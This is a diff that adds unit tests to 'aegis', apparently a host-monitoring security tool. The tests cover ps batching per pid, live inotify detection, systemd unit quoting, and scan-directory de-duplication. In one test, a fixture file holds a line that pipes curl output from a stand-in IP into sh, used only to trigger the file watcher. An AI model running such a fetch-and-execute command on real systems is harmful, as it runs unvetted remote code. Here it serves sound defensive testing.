@@ -23,7 +23,9 @@ Platform-selected constants are exercised by patching the module's platform
 flags where a pure function reads them.
 """
 import os
+import shutil
 import sys
+import tempfile
 import unittest
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -1215,6 +1217,51 @@ class ProcessTableNonAnswerIsNotEmptiness(unittest.TestCase):
         self.assertFalse(aegis._PROC_ENUM_FAILED)
 
 
+class OutboundRowsBatchesPsByPid(unittest.TestCase):
+    """The macOS/BSD outbound branch spawned one `ps -o comm= -p <pid>` per
+    connection ROW. A process with N live outbound connections appears on N
+    netstat lines, so a browser with 8 connections spawned 8 identical lookups
+    (measured: 55 rows / 23 pids = 32 redundant spawns per scan). The Linux and
+    Windows branches already resolve pid->name from one batched structure; this
+    pins the macOS parity fix — one `ps` per unique pid, output unchanged."""
+
+    def setUp(self):
+        self._saved = (aegis.run, aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX,
+                       aegis._parse_netstat_established)
+        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = False, True, False
+
+    def tearDown(self):
+        (aegis.run, aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX,
+         aegis._parse_netstat_established) = self._saved
+
+    def test_one_ps_per_pid_not_per_row(self):
+        rows = [("proc", "500", "1.1.1.1", "443"),
+                ("proc", "500", "1.1.1.2", "443"),
+                ("proc", "500", "1.1.1.3", "443"),
+                ("proc", "600", "2.2.2.2", "80"),
+                ("proc", "600", "2.2.2.3", "80")]
+        aegis._parse_netstat_established = lambda text: iter(rows)
+        ps_calls = []
+
+        def fake_run(cmd, *a, **k):
+            if isinstance(cmd, (list, tuple)) and cmd and cmd[0] == "ps":
+                ps_calls.append(cmd[-1])          # the pid argument
+                return ("browser\n", "", 0)
+            return ("netstat-nonempty", "", 0)    # the NETSTAT_CMD call
+
+        aegis.run = fake_run
+        out = aegis._outbound_rows()
+        # 2 unique pids -> exactly 2 ps spawns, not 5 (one per row).
+        self.assertEqual(2, len(ps_calls),
+                         "ps spawned %d times for 2 unique pids across 5 rows"
+                         % len(ps_calls))
+        # Output is unchanged: every row still resolves to its comm.
+        self.assertEqual(5, len(out))
+        self.assertTrue(all(r[0] == "browser" for r in out))
+        self.assertEqual({"1.1.1.1", "1.1.1.2", "1.1.1.3", "2.2.2.2", "2.2.2.3"},
+                         {r[1] for r in out})
+
+
 class SignatureBatchPrefetch(unittest.TestCase):
     """One PowerShell start-up for many binaries instead of one apiece.
 
@@ -1529,6 +1576,161 @@ class TextEncodingIsPinned(unittest.TestCase):
         out, err, rc = aegis.run(cmd, timeout=10)
         self.assertEqual(rc, 0, "run() failed outright: %r / %r" % (out, err))
         self.assertTrue(out.strip(), "run() returned no output: %r" % (err,))
+
+
+class TestInotifyLive(unittest.TestCase):
+    """Real inotify, against a real Linux kernel: a real fd, a real write, a
+    real wake.
+
+    This SKIPS everywhere it cannot do that, and never passes instead. The
+    distinction is the whole point of the file it lives in — two Windows
+    sensors stayed broken for a release because their tests asserted against
+    fixtures built from the code's own wrong assumptions. A green result for
+    kernel-interface code on a kernel that has no such interface is that same
+    false assurance, so this asks the kernel or admits it could not."""
+
+    def setUp(self):
+        if not aegis.IS_LINUX:
+            self.skipTest("inotify is Linux-only; macOS uses kqueue and "
+                          "Windows polls")
+        if aegis._inotify_libc() is None:
+            self.skipTest("libc exposes no inotify entry points here")
+
+    def test_a_real_write_wakes_a_real_inotify_fd(self):
+        import shutil
+        import tempfile
+        d = tempfile.mkdtemp(prefix="aegis_ino_")
+        real = aegis._watch_paths
+        aegis._watch_paths = lambda: [d]
+        try:
+            fd, watched = aegis._build_watch_inotify()
+            self.assertIsNotNone(fd, "inotify could not be armed at all")
+            self.assertEqual(1, watched)
+            try:
+                # Pole 1: nothing has happened, so the fd must stay quiet.
+                # Without this a function hardwired to return True passes.
+                self.assertFalse(
+                    aegis._wait_for_change_inotify(fd, 0.2),
+                    "inotify reported a change before anything was written")
+                # Pole 2: a real drop into a watched directory wakes it.
+                with open(os.path.join(d, "dropped.sh"), "w") as f:
+                    f.write("#!/bin/sh\ncurl http://198.51.100.7/x | sh\n")
+                self.assertTrue(
+                    aegis._wait_for_change_inotify(fd, 5.0),
+                    "a real file creation did not wake inotify; the Linux "
+                    "watch would be an interval timer wearing an "
+                    "event-driven label")
+                # Pole 3: the fd was drained. inotify is level-triggered, so
+                # an undrained event makes every later select() return
+                # instantly and spins the watch loop at 100% CPU.
+                self.assertFalse(
+                    aegis._wait_for_change_inotify(fd, 0.2),
+                    "the fd was not drained, so the watch loop would spin")
+            finally:
+                os.close(fd)
+        finally:
+            aegis._watch_paths = real
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_arming_nothing_fails_over_to_polling(self):
+        """An empty watch set must report (None, 0) rather than hand back an
+        fd that can never wake — which would silently convert the watch into
+        an interval-only timer while still calling itself event-driven."""
+        real = aegis._watch_paths
+        aegis._watch_paths = lambda: []
+        try:
+            self.assertEqual((None, 0), aegis._build_watch_inotify())
+        finally:
+            aegis._watch_paths = real
+
+
+class TestInotifyAbsentElsewhere(unittest.TestCase):
+
+    def test_inotify_is_absent_not_broken_off_linux(self):
+        """On macOS/Windows the binding must report absence cleanly so
+        cmd_watch falls back to its existing path. A raised exception here
+        would take the whole watch loop down on those platforms."""
+        if aegis.IS_LINUX:
+            self.skipTest("Linux has inotify; this pins the fallback")
+        self.assertIsNone(aegis._inotify_libc())
+        self.assertEqual((None, 0), aegis._build_watch_inotify())
+
+
+class LinuxInstallQuotingAndIdempotency(unittest.TestCase):
+    """R3-2 + R3-3. _install_linux is called directly (it does not gate on
+    IS_LINUX), with systemctl/loginctl stubbed, so this runs on any host."""
+
+    def _run_install(self, mode):
+        calls = []
+        home = tempfile.mkdtemp(prefix="aegis home ")   # a SPACE in $HOME
+        saved = (aegis.run, aegis.HOME)
+        aegis.HOME = home
+
+        def fake_run(cmd, *a, **k):
+            calls.append(list(cmd))
+            return ("Linger=yes", "", 0)
+
+        aegis.run = fake_run
+        try:
+            runtime = os.path.join(home, ".aegis", "aegis.py")
+            aegis._install_linux(runtime, mode, 600)
+            with open(os.path.join(home, ".config", "systemd", "user",
+                                   "aegis.service")) as _fh:
+                svc = _fh.read()
+        finally:
+            aegis.run, aegis.HOME = saved
+            shutil.rmtree(home, ignore_errors=True)
+        exec_line = [l for l in svc.splitlines()
+                     if l.startswith("ExecStart=")][0]
+        return calls, runtime, exec_line
+
+    def test_execstart_quotes_paths_with_spaces(self):
+        # R3-2: an unquoted ExecStart split on the space in $HOME and systemd
+        # then failed the unit on every trigger; Aegis never ran.
+        _calls, runtime, exec_line = self._run_install("watch")
+        self.assertIn('"%s"' % runtime, exec_line,
+                      "runtime path is not a single quoted argument: %s"
+                      % exec_line)
+
+    def test_install_disables_both_units_before_enabling_target(self):
+        # R3-3: idempotent switch + refresh — a still-running `simple` service
+        # kept executing the OLD ~/.aegis copy, and switching modes left the
+        # previous unit running. Both are stopped+disabled before the target is
+        # enabled.
+        calls, _runtime, _exec = self._run_install("watch")
+        disabled = {c[4] for c in calls
+                    if c[:4] == ["systemctl", "--user", "disable", "--now"]}
+        self.assertEqual({"aegis.service", "aegis.timer"}, disabled)
+        enable_idx = next(i for i, c in enumerate(calls) if "enable" in c)
+        disable_idxs = [i for i, c in enumerate(calls) if "disable" in c]
+        self.assertTrue(all(di < enable_idx for di in disable_idxs),
+                        "disable must precede enable")
+
+
+class ScanDirsHaveNoRealpathAliases(unittest.TestCase):
+    """R3-5. macOS's /tmp is a firmlink to /private/tmp; listing both scanned
+    every physical file twice and emitted two findings for one object."""
+
+    def test_no_scan_dir_list_has_a_realpath_duplicate(self):
+        for name in ("HOT_DIRS", "STAGING_DIRS"):
+            lst = getattr(aegis, name)
+            rps = [os.path.realpath(d) for d in lst]
+            self.assertEqual(len(rps), len(set(rps)),
+                             "%s lists the same physical dir twice: %s"
+                             % (name, lst))
+
+    def test_dedup_collapses_a_real_alias(self):
+        # Platform-agnostic: a symlink is the same aliasing the /tmp firmlink is.
+        d = tempfile.mkdtemp()
+        try:
+            real = os.path.join(d, "real")
+            os.makedirs(real)
+            link = os.path.join(d, "link")
+            os.symlink(real, link)
+            self.assertEqual([real], aegis._dedup_by_realpath([real, link]))
+            self.assertEqual([link], aegis._dedup_by_realpath([link, real]))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
 
 
 if __name__ == "__main__":
